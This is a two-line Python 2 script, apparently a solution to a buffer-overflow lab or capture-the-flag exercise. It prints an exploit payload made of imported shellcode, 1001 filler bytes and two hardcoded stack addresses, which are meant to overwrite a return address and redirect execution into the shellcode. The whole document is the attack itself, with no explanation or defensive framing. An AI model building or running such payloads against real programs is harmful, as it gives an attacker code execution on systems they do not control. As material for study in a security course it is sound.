from shellcode import shellcode
print shellcode + '\x01'*1001 + "\x98\x91\xfe\xff" + "\xac\x95\xfe\xff"
